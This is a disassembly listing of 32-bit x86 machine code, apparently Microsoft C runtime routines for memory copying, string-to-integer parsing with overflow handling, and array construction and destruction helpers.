  40367c:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  403680:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  403684:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  403688:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  40368c:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  403690:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  403694:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  40369b:	03 f0                	add    %eax,%esi
  40369d:	03 f8                	add    %eax,%edi
  40369f:	ff 24 95 a8 36 40 00 	jmp    *0x4036a8(,%edx,4)
  4036a6:	8b c0                	mov    %eax,%eax
  4036a8:	b8 36 40 00 c0       	mov    $0xc0004036,%eax
  4036ad:	36 40                	ss inc %eax
  4036af:	00 cc                	add    %cl,%ah
  4036b1:	36 40                	ss inc %eax
  4036b3:	00 e0                	add    %ah,%al
  4036b5:	36 40                	ss inc %eax
  4036b7:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  4036bd:	c9                   	leave
  4036be:	c3                   	ret
  4036bf:	90                   	nop
  4036c0:	8a 06                	mov    (%esi),%al
  4036c2:	88 07                	mov    %al,(%edi)
  4036c4:	8b 45 08             	mov    0x8(%ebp),%eax
  4036c7:	5e                   	pop    %esi
  4036c8:	5f                   	pop    %edi
  4036c9:	c9                   	leave
  4036ca:	c3                   	ret
  4036cb:	90                   	nop
  4036cc:	8a 06                	mov    (%esi),%al
  4036ce:	88 07                	mov    %al,(%edi)
  4036d0:	8a 46 01             	mov    0x1(%esi),%al
  4036d3:	88 47 01             	mov    %al,0x1(%edi)
  4036d6:	8b 45 08             	mov    0x8(%ebp),%eax
  4036d9:	5e                   	pop    %esi
  4036da:	5f                   	pop    %edi
  4036db:	c9                   	leave
  4036dc:	c3                   	ret
  4036dd:	2e 8b c0             	cs mov %eax,%eax
  4036e0:	8a 06                	mov    (%esi),%al
  4036e2:	88 07                	mov    %al,(%edi)
  4036e4:	8a 46 01             	mov    0x1(%esi),%al
  4036e7:	88 47 01             	mov    %al,0x1(%edi)
  4036ea:	8a 46 02             	mov    0x2(%esi),%al
  4036ed:	88 47 02             	mov    %al,0x2(%edi)
  4036f0:	8b 45 08             	mov    0x8(%ebp),%eax
  4036f3:	5e                   	pop    %esi
  4036f4:	5f                   	pop    %edi
  4036f5:	c9                   	leave
  4036f6:	c3                   	ret
  4036f7:	90                   	nop
  4036f8:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  4036fc:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  403700:	f7 c7 03 00 00 00    	test   $0x3,%edi
  403706:	75 24                	jne    0x40372c
  403708:	c1 e9 02             	shr    $0x2,%ecx
  40370b:	83 e2 03             	and    $0x3,%edx
  40370e:	83 f9 08             	cmp    $0x8,%ecx
  403711:	72 0d                	jb     0x403720
  403713:	fd                   	std
  403714:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403716:	fc                   	cld
  403717:	ff 24 95 40 38 40 00 	jmp    *0x403840(,%edx,4)
  40371e:	8b c0                	mov    %eax,%eax
  403720:	f7 d9                	neg    %ecx
  403722:	ff 24 8d f0 37 40 00 	jmp    *0x4037f0(,%ecx,4)
  403729:	2e 8b c0             	cs mov %eax,%eax
  40372c:	8b c7                	mov    %edi,%eax
  40372e:	ba 03 00 00 00       	mov    $0x3,%edx
  403733:	83 f9 04             	cmp    $0x4,%ecx
  403736:	72 0c                	jb     0x403744
  403738:	83 e0 03             	and    $0x3,%eax
  40373b:	2b c8                	sub    %eax,%ecx
  40373d:	ff 24 85 48 37 40 00 	jmp    *0x403748(,%eax,4)
  403744:	ff 24 8d 40 38 40 00 	jmp    *0x403840(,%ecx,4)
  40374b:	90                   	nop
  40374c:	58                   	pop    %eax
  40374d:	37                   	aaa
  40374e:	40                   	inc    %eax
  40374f:	00 78 37             	add    %bh,0x37(%eax)
  403752:	40                   	inc    %eax
  403753:	00 a0 37 40 00 8a    	add    %ah,-0x75ffbfc9(%eax)
  403759:	46                   	inc    %esi
  40375a:	03 23                	add    (%ebx),%esp
  40375c:	d1 88 47 03 4e c1    	rorl   $1,-0x3eb1fcb9(%eax)
  403762:	e9 02 4f 83 f9       	jmp    0xf9c38669
  403767:	08 72 b6             	or     %dh,-0x4a(%edx)
  40376a:	fd                   	std
  40376b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40376d:	fc                   	cld
  40376e:	ff 24 95 40 38 40 00 	jmp    *0x403840(,%edx,4)
  403775:	2e 8b c0             	cs mov %eax,%eax
  403778:	8a 46 03             	mov    0x3(%esi),%al
  40377b:	23 d1                	and    %ecx,%edx
  40377d:	88 47 03             	mov    %al,0x3(%edi)
  403780:	8a 46 02             	mov    0x2(%esi),%al
  403783:	c1 e9 02             	shr    $0x2,%ecx
  403786:	88 47 02             	mov    %al,0x2(%edi)
  403789:	83 ee 02             	sub    $0x2,%esi
  40378c:	83 ef 02             	sub    $0x2,%edi
  40378f:	83 f9 08             	cmp    $0x8,%ecx
  403792:	72 8c                	jb     0x403720
  403794:	fd                   	std
  403795:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403797:	fc                   	cld
  403798:	ff 24 95 40 38 40 00 	jmp    *0x403840(,%edx,4)
  40379f:	90                   	nop
  4037a0:	8a 46 03             	mov    0x3(%esi),%al
  4037a3:	23 d1                	and    %ecx,%edx
  4037a5:	88 47 03             	mov    %al,0x3(%edi)
  4037a8:	8a 46 02             	mov    0x2(%esi),%al
  4037ab:	88 47 02             	mov    %al,0x2(%edi)
  4037ae:	8a 46 01             	mov    0x1(%esi),%al
  4037b1:	c1 e9 02             	shr    $0x2,%ecx
  4037b4:	88 47 01             	mov    %al,0x1(%edi)
  4037b7:	83 ee 03             	sub    $0x3,%esi
  4037ba:	83 ef 03             	sub    $0x3,%edi
  4037bd:	83 f9 08             	cmp    $0x8,%ecx
  4037c0:	0f 82 5a ff ff ff    	jb     0x403720
  4037c6:	fd                   	std
  4037c7:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4037c9:	fc                   	cld
  4037ca:	ff 24 95 40 38 40 00 	jmp    *0x403840(,%edx,4)
  4037d1:	2e 8b c0             	cs mov %eax,%eax
  4037d4:	f4                   	hlt
  4037d5:	37                   	aaa
  4037d6:	40                   	inc    %eax
  4037d7:	00 fc                	add    %bh,%ah
  4037d9:	37                   	aaa
  4037da:	40                   	inc    %eax
  4037db:	00 04 38             	add    %al,(%eax,%edi,1)
  4037de:	40                   	inc    %eax
  4037df:	00 0c 38             	add    %cl,(%eax,%edi,1)
  4037e2:	40                   	inc    %eax
  4037e3:	00 14 38             	add    %dl,(%eax,%edi,1)
  4037e6:	40                   	inc    %eax
  4037e7:	00 1c 38             	add    %bl,(%eax,%edi,1)
  4037ea:	40                   	inc    %eax
  4037eb:	00 24 38             	add    %ah,(%eax,%edi,1)
  4037ee:	40                   	inc    %eax
  4037ef:	00 37                	add    %dh,(%edi)
  4037f1:	38 40 00             	cmp    %al,0x0(%eax)
  4037f4:	8b 44 8e 1c          	mov    0x1c(%esi,%ecx,4),%eax
  4037f8:	89 44 8f 1c          	mov    %eax,0x1c(%edi,%ecx,4)
  4037fc:	8b 44 8e 18          	mov    0x18(%esi,%ecx,4),%eax
  403800:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  403804:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  403808:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  40380c:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  403810:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  403814:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  403818:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  40381c:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  403820:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  403824:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  403828:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  40382c:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  403833:	03 f0                	add    %eax,%esi
  403835:	03 f8                	add    %eax,%edi
  403837:	ff 24 95 40 38 40 00 	jmp    *0x403840(,%edx,4)
  40383e:	8b c0                	mov    %eax,%eax
  403840:	50                   	push   %eax
  403841:	38 40 00             	cmp    %al,0x0(%eax)
  403844:	58                   	pop    %eax
  403845:	38 40 00             	cmp    %al,0x0(%eax)
  403848:	68 38 40 00 7c       	push   $0x7c004038
  40384d:	38 40 00             	cmp    %al,0x0(%eax)
  403850:	8b 45 08             	mov    0x8(%ebp),%eax
  403853:	5e                   	pop    %esi
  403854:	5f                   	pop    %edi
  403855:	c9                   	leave
  403856:	c3                   	ret
  403857:	90                   	nop
  403858:	8a 46 03             	mov    0x3(%esi),%al
  40385b:	88 47 03             	mov    %al,0x3(%edi)
  40385e:	8b 45 08             	mov    0x8(%ebp),%eax
  403861:	5e                   	pop    %esi
  403862:	5f                   	pop    %edi
  403863:	c9                   	leave
  403864:	c3                   	ret
  403865:	2e 8b c0             	cs mov %eax,%eax
  403868:	8a 46 03             	mov    0x3(%esi),%al
  40386b:	88 47 03             	mov    %al,0x3(%edi)
  40386e:	8a 46 02             	mov    0x2(%esi),%al
  403871:	88 47 02             	mov    %al,0x2(%edi)
  403874:	8b 45 08             	mov    0x8(%ebp),%eax
  403877:	5e                   	pop    %esi
  403878:	5f                   	pop    %edi
  403879:	c9                   	leave
  40387a:	c3                   	ret
  40387b:	90                   	nop
  40387c:	8a 46 03             	mov    0x3(%esi),%al
  40387f:	88 47 03             	mov    %al,0x3(%edi)
  403882:	8a 46 02             	mov    0x2(%esi),%al
  403885:	88 47 02             	mov    %al,0x2(%edi)
  403888:	8a 46 01             	mov    0x1(%esi),%al
  40388b:	88 47 01             	mov    %al,0x1(%edi)
  40388e:	8b 45 08             	mov    0x8(%ebp),%eax
  403891:	5e                   	pop    %esi
  403892:	5f                   	pop    %edi
  403893:	c9                   	leave
  403894:	c3                   	ret
  403895:	cc                   	int3
  403896:	cc                   	int3
  403897:	cc                   	int3
  403898:	cc                   	int3
  403899:	cc                   	int3
  40389a:	cc                   	int3
  40389b:	cc                   	int3
  40389c:	cc                   	int3
  40389d:	cc                   	int3
  40389e:	cc                   	int3
  40389f:	cc                   	int3
  4038a0:	83 ec 0c             	sub    $0xc,%esp
  4038a3:	53                   	push   %ebx
  4038a4:	55                   	push   %ebp
  4038a5:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  4038a9:	56                   	push   %esi
  4038aa:	57                   	push   %edi
  4038ab:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4038b2:	00 
  4038b3:	8a 5d 00             	mov    0x0(%ebp),%bl
  4038b6:	45                   	inc    %ebp
  4038b7:	88 5c 24 10          	mov    %bl,0x10(%esp)
  4038bb:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  4038bf:	83 3d 3c c0 42 00 01 	cmpl   $0x1,0x42c03c
  4038c6:	7e 18                	jle    0x4038e0
  4038c8:	8b 74 24 10          	mov    0x10(%esp),%esi
  4038cc:	6a 08                	push   $0x8
  4038ce:	8b c6                	mov    %esi,%eax
  4038d0:	25 ff 00 00 00       	and    $0xff,%eax
  4038d5:	50                   	push   %eax
  4038d6:	e8 55 39 00 00       	call   0x407230
  4038db:	83 c4 08             	add    $0x8,%esp
  4038de:	eb 18                	jmp    0x4038f8
  4038e0:	8b 74 24 10          	mov    0x10(%esp),%esi
  4038e4:	8b 15 30 be 42 00    	mov    0x42be30,%edx
  4038ea:	8b ce                	mov    %esi,%ecx
  4038ec:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  4038f2:	8a 04 4a             	mov    (%edx,%ecx,2),%al
  4038f5:	83 e0 08             	and    $0x8,%eax
  4038f8:	85 c0                	test   %eax,%eax
  4038fa:	74 0a                	je     0x403906
  4038fc:	8a 5d 00             	mov    0x0(%ebp),%bl
  4038ff:	45                   	inc    %ebp
  403900:	88 5c 24 10          	mov    %bl,0x10(%esp)
  403904:	eb b9                	jmp    0x4038bf
  403906:	80 fb 2d             	cmp    $0x2d,%bl
  403909:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  40390d:	75 07                	jne    0x403916
  40390f:	83 4c 24 2c 02       	orl    $0x2,0x2c(%esp)
  403914:	eb 05                	jmp    0x40391b
  403916:	80 fb 2b             	cmp    $0x2b,%bl
  403919:	75 10                	jne    0x40392b
  40391b:	8a 5d 00             	mov    0x0(%ebp),%bl
  40391e:	45                   	inc    %ebp
  40391f:	88 5c 24 10          	mov    %bl,0x10(%esp)
  403923:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  403927:	8b 74 24 10          	mov    0x10(%esp),%esi
  40392b:	8b 7c 24 28          	mov    0x28(%esp),%edi
  40392f:	85 ff                	test   %edi,%edi
  403931:	0f 8c d2 01 00 00    	jl     0x403b09
  403937:	83 ff 01             	cmp    $0x1,%edi
  40393a:	0f 84 c9 01 00 00    	je     0x403b09
  403940:	83 ff 24             	cmp    $0x24,%edi
  403943:	0f 8f c0 01 00 00    	jg     0x403b09
  403949:	85 ff                	test   %edi,%edi
  40394b:	75 21                	jne    0x40396e
  40394d:	80 fb 30             	cmp    $0x30,%bl
  403950:	74 07                	je     0x403959
  403952:	bf 0a 00 00 00       	mov    $0xa,%edi
  403957:	eb 15                	jmp    0x40396e
  403959:	8a 45 00             	mov    0x0(%ebp),%al
  40395c:	3c 78                	cmp    $0x78,%al
  40395e:	74 09                	je     0x403969
  403960:	3c 58                	cmp    $0x58,%al
  403962:	bf 08 00 00 00       	mov    $0x8,%edi
  403967:	75 05                	jne    0x40396e
  403969:	bf 10 00 00 00       	mov    $0x10,%edi
  40396e:	83 ff 10             	cmp    $0x10,%edi
  403971:	75 21                	jne    0x403994
  403973:	80 fb 30             	cmp    $0x30,%bl
  403976:	75 1c                	jne    0x403994
  403978:	8a 45 00             	mov    0x0(%ebp),%al
  40397b:	3c 78                	cmp    $0x78,%al
  40397d:	74 04                	je     0x403983
  40397f:	3c 58                	cmp    $0x58,%al
  403981:	75 11                	jne    0x403994
  403983:	8a 5d 01             	mov    0x1(%ebp),%bl
  403986:	45                   	inc    %ebp
  403987:	88 5c 24 10          	mov    %bl,0x10(%esp)
  40398b:	45                   	inc    %ebp
  40398c:	8b 74 24 10          	mov    0x10(%esp),%esi
  403990:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  403994:	83 c8 ff             	or     $0xffffffff,%eax
  403997:	33 d2                	xor    %edx,%edx
  403999:	f7 f7                	div    %edi
  40399b:	8b e8                	mov    %eax,%ebp
  40399d:	83 3d 3c c0 42 00 01 	cmpl   $0x1,0x42c03c
  4039a4:	7e 13                	jle    0x4039b9
  4039a6:	81 e6 ff 00 00 00    	and    $0xff,%esi
  4039ac:	6a 04                	push   $0x4
  4039ae:	56                   	push   %esi
  4039af:	e8 7c 38 00 00       	call   0x407230
  4039b4:	83 c4 08             	add    $0x8,%esp
  4039b7:	eb 11                	jmp    0x4039ca
  4039b9:	a1 30 be 42 00       	mov    0x42be30,%eax
  4039be:	81 e6 ff 00 00 00    	and    $0xff,%esi
  4039c4:	8a 04 70             	mov    (%eax,%esi,2),%al
  4039c7:	83 e0 04             	and    $0x4,%eax
  4039ca:	85 c0                	test   %eax,%eax
  4039cc:	74 08                	je     0x4039d6
  4039ce:	0f be cb             	movsbl %bl,%ecx
  4039d1:	83 e9 30             	sub    $0x30,%ecx
  4039d4:	eb 3d                	jmp    0x403a13
  4039d6:	83 3d 3c c0 42 00 01 	cmpl   $0x1,0x42c03c
  4039dd:	7e 10                	jle    0x4039ef
  4039df:	68 03 01 00 00       	push   $0x103
  4039e4:	56                   	push   %esi
  4039e5:	e8 46 38 00 00       	call   0x407230
  4039ea:	83 c4 08             	add    $0x8,%esp
  4039ed:	eb 0f                	jmp    0x4039fe
  4039ef:	8b 0d 30 be 42 00    	mov    0x42be30,%ecx
  4039f5:	66 8b 04 71          	mov    (%ecx,%esi,2),%ax
  4039f9:	25 03 01 00 00       	and    $0x103,%eax
  4039fe:	85 c0                	test   %eax,%eax
  403a00:	74 62                	je     0x403a64
  403a02:	0f be d3             	movsbl %bl,%edx
  403a05:	52                   	push   %edx
  403a06:	e8 05 39 00 00       	call   0x407310
  403a0b:	8b c8                	mov    %eax,%ecx
  403a0d:	83 c4 04             	add    $0x4,%esp
  403a10:	83 e9 37             	sub    $0x37,%ecx
  403a13:	3b cf                	cmp    %edi,%ecx
  403a15:	73 4d                	jae    0x403a64
  403a17:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  403a1b:	8b 74 24 18          	mov    0x18(%esp),%esi
  403a1f:	83 ca 08             	or     $0x8,%edx
  403a22:	3b f5                	cmp    %ebp,%esi
  403a24:	89 54 24 2c          	mov    %edx,0x2c(%esp)
  403a28:	72 19                	jb     0x403a43
  403a2a:	75 0b                	jne    0x403a37
  403a2c:	83 c8 ff             	or     $0xffffffff,%eax
  403a2f:	33 d2                	xor    %edx,%edx
  403a31:	f7 f7                	div    %edi
  403a33:	3b ca                	cmp    %edx,%ecx
  403a35:	76 0c                	jbe    0x403a43
  403a37:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403a3b:	0c 04                	or     $0x4,%al
  403a3d:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  403a41:	eb 09                	jmp    0x403a4c
  403a43:	0f af f7             	imul   %edi,%esi
  403a46:	03 f1                	add    %ecx,%esi
  403a48:	89 74 24 18          	mov    %esi,0x18(%esp)
  403a4c:	8b 44 24 14          	mov    0x14(%esp),%eax
  403a50:	8a 18                	mov    (%eax),%bl
  403a52:	40                   	inc    %eax
  403a53:	88 5c 24 10          	mov    %bl,0x10(%esp)
  403a57:	89 44 24 14          	mov    %eax,0x14(%esp)
  403a5b:	8b 74 24 10          	mov    0x10(%esp),%esi
  403a5f:	e9 39 ff ff ff       	jmp    0x40399d
  403a64:	8b 54 24 14          	mov    0x14(%esp),%edx
  403a68:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403a6c:	8b 74 24 24          	mov    0x24(%esp),%esi
  403a70:	4a                   	dec    %edx
  403a71:	a8 08                	test   $0x8,%al
  403a73:	89 54 24 14          	mov    %edx,0x14(%esp)
  403a77:	75 16                	jne    0x403a8f
  403a79:	85 f6                	test   %esi,%esi
  403a7b:	74 08                	je     0x403a85
  403a7d:	8b 44 24 20          	mov    0x20(%esp),%eax
  403a81:	89 44 24 14          	mov    %eax,0x14(%esp)
  403a85:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  403a8c:	00 
  403a8d:	eb 53                	jmp    0x403ae2
  403a8f:	a8 04                	test   $0x4,%al
  403a91:	75 21                	jne    0x403ab4
  403a93:	a8 01                	test   $0x1,%al
  403a95:	75 4b                	jne    0x403ae2
  403a97:	83 e0 02             	and    $0x2,%eax
  403a9a:	74 0a                	je     0x403aa6
  403a9c:	81 7c 24 18 00 00 00 	cmpl   $0x80000000,0x18(%esp)
  403aa3:	80 
  403aa4:	77 0e                	ja     0x403ab4
  403aa6:	85 c0                	test   %eax,%eax
  403aa8:	75 38                	jne    0x403ae2
  403aaa:	81 7c 24 18 ff ff ff 	cmpl   $0x7fffffff,0x18(%esp)
  403ab1:	7f 
  403ab2:	76 2e                	jbe    0x403ae2
  403ab4:	e8 b7 06 00 00       	call   0x404170
  403ab9:	c7 00 22 00 00 00    	movl   $0x22,(%eax)
  403abf:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403ac3:	a8 01                	test   $0x1,%al
  403ac5:	74 0a                	je     0x403ad1
  403ac7:	c7 44 24 18 ff ff ff 	movl   $0xffffffff,0x18(%esp)
  403ace:	ff 
  403acf:	eb 11                	jmp    0x403ae2
  403ad1:	24 02                	and    $0x2,%al
  403ad3:	f6 d8                	neg    %al
  403ad5:	1b c0                	sbb    %eax,%eax
  403ad7:	f7 d8                	neg    %eax
  403ad9:	05 ff ff ff 7f       	add    $0x7fffffff,%eax
  403ade:	89 44 24 18          	mov    %eax,0x18(%esp)
  403ae2:	85 f6                	test   %esi,%esi
  403ae4:	74 06                	je     0x403aec
  403ae6:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403aea:	89 0e                	mov    %ecx,(%esi)
  403aec:	f6 44 24 2c 02       	testb  $0x2,0x2c(%esp)
  403af1:	74 0a                	je     0x403afd
  403af3:	8b 54 24 18          	mov    0x18(%esp),%edx
  403af7:	f7 da                	neg    %edx
  403af9:	89 54 24 18          	mov    %edx,0x18(%esp)
  403afd:	8b 44 24 18          	mov    0x18(%esp),%eax
  403b01:	5f                   	pop    %edi
  403b02:	5e                   	pop    %esi
  403b03:	5d                   	pop    %ebp
  403b04:	5b                   	pop    %ebx
  403b05:	83 c4 0c             	add    $0xc,%esp
  403b08:	c3                   	ret
  403b09:	8b 44 24 24          	mov    0x24(%esp),%eax
  403b0d:	85 c0                	test   %eax,%eax
  403b0f:	74 06                	je     0x403b17
  403b11:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403b15:	89 08                	mov    %ecx,(%eax)
  403b17:	5f                   	pop    %edi
  403b18:	5e                   	pop    %esi
  403b19:	5d                   	pop    %ebp
  403b1a:	33 c0                	xor    %eax,%eax
  403b1c:	5b                   	pop    %ebx
  403b1d:	83 c4 0c             	add    $0xc,%esp
  403b20:	c3                   	ret
  403b21:	90                   	nop
  403b22:	90                   	nop
  403b23:	90                   	nop
  403b24:	90                   	nop
  403b25:	90                   	nop
  403b26:	90                   	nop
  403b27:	90                   	nop
  403b28:	90                   	nop
  403b29:	90                   	nop
  403b2a:	90                   	nop
  403b2b:	90                   	nop
  403b2c:	90                   	nop
  403b2d:	90                   	nop
  403b2e:	90                   	nop
  403b2f:	90                   	nop
  403b30:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403b34:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403b38:	8b 54 24 04          	mov    0x4(%esp),%edx
  403b3c:	6a 01                	push   $0x1
  403b3e:	50                   	push   %eax
  403b3f:	51                   	push   %ecx
  403b40:	52                   	push   %edx
  403b41:	e8 5a fd ff ff       	call   0x4038a0
  403b46:	83 c4 10             	add    $0x10,%esp
  403b49:	c3                   	ret
  403b4a:	90                   	nop
  403b4b:	90                   	nop
  403b4c:	90                   	nop
  403b4d:	90                   	nop
  403b4e:	90                   	nop
  403b4f:	90                   	nop
  403b50:	8b 44 24 04          	mov    0x4(%esp),%eax
  403b54:	33 c9                	xor    %ecx,%ecx
  403b56:	8a 08                	mov    (%eax),%cl
  403b58:	8a 91 01 ee 42 00    	mov    0x42ee01(%ecx),%dl
  403b5e:	80 e2 04             	and    $0x4,%dl
  403b61:	40                   	inc    %eax
  403b62:	84 d2                	test   %dl,%dl
  403b64:	74 01                	je     0x403b67
  403b66:	40                   	inc    %eax
  403b67:	c3                   	ret
  403b68:	90                   	nop
  403b69:	90                   	nop
  403b6a:	90                   	nop
  403b6b:	90                   	nop
  403b6c:	90                   	nop
  403b6d:	90                   	nop
  403b6e:	90                   	nop
  403b6f:	90                   	nop
  403b70:	55                   	push   %ebp
  403b71:	8b ec                	mov    %esp,%ebp
  403b73:	6a ff                	push   $0xffffffff
  403b75:	68 b8 4e 42 00       	push   $0x424eb8
  403b7a:	68 a8 60 40 00       	push   $0x4060a8
  403b7f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403b85:	50                   	push   %eax
  403b86:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403b8d:	83 c4 f0             	add    $0xfffffff0,%esp
  403b90:	53                   	push   %ebx
  403b91:	56                   	push   %esi
  403b92:	57                   	push   %edi
  403b93:	33 f6                	xor    %esi,%esi
  403b95:	89 75 e0             	mov    %esi,-0x20(%ebp)
  403b98:	89 75 fc             	mov    %esi,-0x4(%ebp)
  403b9b:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  403b9e:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403ba1:	8b 7d 08             	mov    0x8(%ebp),%edi
  403ba4:	3b 75 10             	cmp    0x10(%ebp),%esi
  403ba7:	7d 10                	jge    0x403bb9
  403ba9:	8b cf                	mov    %edi,%ecx
  403bab:	ff 55 14             	call   *0x14(%ebp)
  403bae:	03 fb                	add    %ebx,%edi
  403bb0:	89 7d 08             	mov    %edi,0x8(%ebp)
  403bb3:	46                   	inc    %esi
  403bb4:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  403bb7:	eb eb                	jmp    0x403ba4
  403bb9:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  403bc0:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403bc7:	e8 1c 00 00 00       	call   0x403be8
  403bcc:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403bcf:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403bd6:	5f                   	pop    %edi
  403bd7:	5e                   	pop    %esi
  403bd8:	5b                   	pop    %ebx
  403bd9:	8b e5                	mov    %ebp,%esp
  403bdb:	5d                   	pop    %ebp
  403bdc:	c2 14 00             	ret    $0x14
  403bdf:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403be2:	8b 7d 08             	mov    0x8(%ebp),%edi
  403be5:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  403be8:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403beb:	85 c0                	test   %eax,%eax
  403bed:	75 0c                	jne    0x403bfb
  403bef:	8b 45 18             	mov    0x18(%ebp),%eax
  403bf2:	50                   	push   %eax
  403bf3:	56                   	push   %esi
  403bf4:	53                   	push   %ebx
  403bf5:	57                   	push   %edi
  403bf6:	e8 c5 00 00 00       	call   0x403cc0
  403bfb:	c3                   	ret
  403bfc:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403bff:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403c06:	5f                   	pop    %edi
  403c07:	5e                   	pop    %esi
  403c08:	5b                   	pop    %ebx
  403c09:	8b e5                	mov    %ebp,%esp
  403c0b:	5d                   	pop    %ebp
  403c0c:	c2 14 00             	ret    $0x14
  403c0f:	90                   	nop
  403c10:	55                   	push   %ebp
  403c11:	8b ec                	mov    %esp,%ebp
  403c13:	6a ff                	push   $0xffffffff
  403c15:	68 c8 4e 42 00       	push   $0x424ec8
  403c1a:	68 a8 60 40 00       	push   $0x4060a8
  403c1f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403c25:	50                   	push   %eax
  403c26:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403c2d:	83 c4 f4             	add    $0xfffffff4,%esp
  403c30:	53                   	push   %ebx
  403c31:	56                   	push   %esi
  403c32:	57                   	push   %edi
  403c33:	33 c0                	xor    %eax,%eax
  403c35:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403c38:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403c3b:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403c3e:	0f af cf             	imul   %edi,%ecx
  403c41:	8b 75 08             	mov    0x8(%ebp),%esi
  403c44:	03 f1                	add    %ecx,%esi
  403c46:	89 75 08             	mov    %esi,0x8(%ebp)
  403c49:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403c4c:	ff 4d 10             	decl   0x10(%ebp)
  403c4f:	78 0c                	js     0x403c5d
  403c51:	2b f7                	sub    %edi,%esi
  403c53:	89 75 08             	mov    %esi,0x8(%ebp)
  403c56:	8b ce                	mov    %esi,%ecx
  403c58:	ff 55 14             	call   *0x14(%ebp)
  403c5b:	eb ef                	jmp    0x403c4c
  403c5d:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  403c64:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403c6b:	e8 19 00 00 00       	call   0x403c89
  403c70:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403c73:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403c7a:	5f                   	pop    %edi
  403c7b:	5e                   	pop    %esi
  403c7c:	5b                   	pop    %ebx
  403c7d:	8b e5                	mov    %ebp,%esp
  403c7f:	5d                   	pop    %ebp
  403c80:	c2 10 00             	ret    $0x10
  403c83:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403c86:	8b 75 08             	mov    0x8(%ebp),%esi
  403c89:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403c8c:	85 c0                	test   %eax,%eax
  403c8e:	75 0f                	jne    0x403c9f
  403c90:	8b 55 14             	mov    0x14(%ebp),%edx
  403c93:	52                   	push   %edx
  403c94:	8b 45 10             	mov    0x10(%ebp),%eax
  403c97:	50                   	push   %eax
  403c98:	57                   	push   %edi
  403c99:	56                   	push   %esi
  403c9a:	e8 21 00 00 00       	call   0x403cc0
  403c9f:	c3                   	ret
  403ca0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403ca3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403caa:	5f                   	pop    %edi
  403cab:	5e                   	pop    %esi
  403cac:	5b                   	pop    %ebx
  403cad:	8b e5                	mov    %ebp,%esp
  403caf:	5d                   	pop    %ebp
  403cb0:	c2 10 00             	ret    $0x10
  403cb3:	90                   	nop
  403cb4:	90                   	nop
  403cb5:	90                   	nop
  403cb6:	90                   	nop
  403cb7:	90                   	nop
  403cb8:	90                   	nop
  403cb9:	90                   	nop
  403cba:	90                   	nop
